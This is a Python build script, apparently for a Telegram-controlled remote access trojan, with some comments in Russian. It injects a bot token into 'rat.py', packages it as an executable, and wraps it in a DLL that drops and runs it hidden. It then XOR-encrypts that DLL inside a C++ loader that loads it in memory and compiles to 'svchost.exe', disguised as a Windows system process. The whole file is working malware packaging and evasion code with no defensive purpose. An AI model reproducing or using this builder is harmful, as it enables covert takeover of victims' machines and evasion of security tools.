import os
import sys
import subprocess
import random
import zlib
import shutil
import time

class StealthBuilder:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
        
    def build_exe_with_pyinstaller(self):
        print("[+] Building EXE with PyInstaller...")
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", "payload",
            "--target-arch", "x86",
            "--upx-dir", "C:\\ProgramData\\chocolatey\\lib\\upx\\tools",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "psutil",
            "--hidden-import", "requests",
            "--hidden-import", "sounddevice",
            "--hidden-import", "soundfile",
            "--hidden-import", "cryptography",
            "--hidden-import", "cryptography.fernet",
            "--hidden-import", "tkinter",
            "--hidden-import", "pycaw",
            "--hidden-import", "comtypes",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "GPUtil",
            "--hidden-import", "win10toast",
            "--collect-all", "telegram",
            "rat.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] PyInstaller error: {result.stderr.decode()}")
            return None
            
        exe_path = "dist/payload.exe"
        if not os.path.exists(exe_path):
            for f in os.listdir("dist"):
                if f.endswith(".exe"):
                    exe_path = os.path.join("dist", f)
                    break
        
        if not os.path.exists(exe_path):
            print("[-] EXE not found!")
            return None
            
        shutil.copy(exe_path, "payload.exe")
        size_mb = os.path.getsize('payload.exe') / (1024*1024)
        print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
        return "payload.exe"
    
    def create_dll_from_exe(self, exe_path):
        print("[+] Creating DLL from EXE...")
        
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        # Простой C код без спецсимволов
        dll_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

static unsigned char exe_data[] = {DATA};
static unsigned int exe_size = SIZE;

static void RunEXE() {
    char temp_path[MAX_PATH];
    char exe_path[MAX_PATH];
    DWORD written;
    HANDLE hFile;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
    
    hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    WriteFile(hFile, exe_data, exe_size, &written, NULL);
    CloseHandle(hFile);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    Sleep(5000);
    DeleteFileA(exe_path);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunEXE, NULL, 0, NULL);
    }
    return TRUE;
}
'''
        # Генерируем HEX данные
        hex_parts = []
        for i, b in enumerate(exe_data):
            if i % 16 == 0:
                hex_parts.append('\n    ')
            hex_parts.append(f'0x{b:02X}, ')
        
        hex_string = ''.join(hex_parts).rstrip(', ')
        
        # Заменяем плейсхолдеры
        final_code = dll_code.replace('{DATA}', hex_string)
        final_code = final_code.replace('{SIZE}', str(len(exe_data)))
        
        # Сохраняем как ASCII
        with open('payload_dll.c', 'w', encoding='ascii', errors='ignore') as f:
            f.write(final_code)
        
        # Компилируем DLL
        cmd = [
            'gcc', '-shared', '-o', 'payload.dll',
            'payload_dll.c',
            '-static', '-s', '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] DLL error: {result.stderr.decode()}")
            return None
            
        size_mb = os.path.getsize('payload.dll') / (1024*1024)
        print(f"[+] DLL ready! Size: {size_mb:.1f} MB")
        return "payload.dll"
    
    def encrypt_and_build_loader(self, dll_path):
        print("[+] Encrypting DLL...")
        
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        compressed = zlib.compress(dll_data, level=9)
        
        encrypted = bytearray(compressed)
        for i in range(len(encrypted)):
            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
        
        with open('encrypted.bin', 'wb') as f:
            f.write(encrypted)
        with open('key.bin', 'wb') as f:
            f.write(self.xor_key)
        
        size_mb = len(encrypted) / (1024*1024)
        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
        
        # Создаем загрузчик с встроенными данными (маленький массив)
        print("[+] Creating loader...")
        
        # Конвертируем зашифрованные данные в C массив
        enc_hex = []
        for i, b in enumerate(encrypted):
            if i % 16 == 0:
                enc_hex.append('\n    ')
            enc_hex.append(f'0x{b:02X}, ')
        enc_string = ''.join(enc_hex).rstrip(', ')
        
        key_hex = []
        for i, b in enumerate(self.xor_key):
            if i % 16 == 0:
                key_hex.append('\n    ')
            key_hex.append(f'0x{b:02X}, ')
        key_string = ''.join(key_hex).rstrip(', ')
        
        loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

static unsigned char encrypted_dll[] = {{{enc_string}}};
static unsigned int dll_len = {len(encrypted)};

static unsigned char xor_key[] = {{{key_string}}};
static unsigned int key_len = {len(self.xor_key)};

static void xor_decrypt(unsigned char* data, unsigned int len, 
                        unsigned char* key, unsigned int key_len) {{
    for (unsigned int i = 0; i < len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

static bool LoadDLLFromMemory(unsigned char* dll_data, unsigned int dll_size) {{
    if (dll_data[0] != 'M' || dll_data[1] != 'Z') return false;
    
    void* dll_memory = VirtualAlloc(NULL, dll_size, 
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_EXECUTE_READWRITE);
    if (!dll_memory) return false;
    
    memcpy(dll_memory, dll_data, dll_size);
    
    unsigned char* bytes = (unsigned char*)dll_memory;
    unsigned int e_lfanew = *(unsigned int*)&bytes[0x3C];
    unsigned int entry_point_rva = *(unsigned int*)&bytes[e_lfanew + 0x28];
    
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t dll_main = (DllMain_t)((unsigned char*)dll_memory + entry_point_rva);
    
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dll_main, 
                                  dll_memory, 0, NULL);
    if (hThread) {{
        CloseHandle(hThread);
        return true;
    }}
    
    return dll_main((HINSTANCE)dll_memory, DLL_PROCESS_ATTACH, NULL) == TRUE;
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
    if (!decrypted) return 1;
    
    memcpy(decrypted, encrypted_dll, dll_len);
    
    xor_decrypt(decrypted, dll_len, xor_key, key_len);
    
    bool success = LoadDLLFromMemory(decrypted, dll_len);
    
    if (!success) {{
        char temp_path[MAX_PATH];
        char dll_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        sprintf(dll_path, "%s\\\\tmp_%x.dll", temp_path, GetTickCount());
        
        HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {{
            DWORD written;
            WriteFile(hFile, decrypted, dll_len, &written, NULL);
            CloseHandle(hFile);
            LoadLibraryA(dll_path);
            Sleep(3000);
            DeleteFileA(dll_path);
        }}
    }}
    
    free(decrypted);
    
    while (1) Sleep(10000);
    return 0;
}}
'''
        with open('loader_final.cpp', 'w', encoding='ascii', errors='ignore') as f:
            f.write(loader_code)
        
        print("[+] Loader ready!")
        return 'loader_final.cpp'
    
    def compile_loader(self, loader_path):
        print("[+] Compiling final EXE...")
        
        cmd = [
            'g++',
            '-o', 'svchost.exe',
            loader_path,
            '-static',
            '-s',
            '-O1',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] Error: {result.stderr.decode()}")
            return None
        
        size_kb = os.path.getsize('svchost.exe') / 1024
        print(f"[+] FINAL EXE ready! Size: {size_kb:.1f} KB")
        return 'svchost.exe'
    
    def build(self):
        print("[+] STARTING STEALTH RAT BUILD")
        print("=" * 60)
        
        print("[+] Updating rat.py...")
        with open('rat.py', 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace('{{TOKEN}}', self.token)
        content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
        with open('rat.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        exe = self.build_exe_with_pyinstaller()
        if not exe:
            return False
        
        dll = self.create_dll_from_exe(exe)
        if not dll:
            return False
        
        loader = self.encrypt_and_build_loader(dll)
        if not loader:
            return False
        
        final_exe = self.compile_loader(loader)
        
        if final_exe:
            print("=" * 60)
            print("[+] BUILD COMPLETED SUCCESSFULLY!")
            print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
            print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
            print(f"[+] DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
            print(f"[+] Key: {self.xor_key.hex()}")
            
            with open('key.txt', 'w') as f:
                f.write(self.xor_key.hex())
            
            return True
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python build.py TOKEN ADMIN_ID")
        sys.exit(1)
    
    token = sys.argv[1]
    admin_id = sys.argv[2]
    
    builder = StealthBuilder(token, admin_id)
    builder.build()
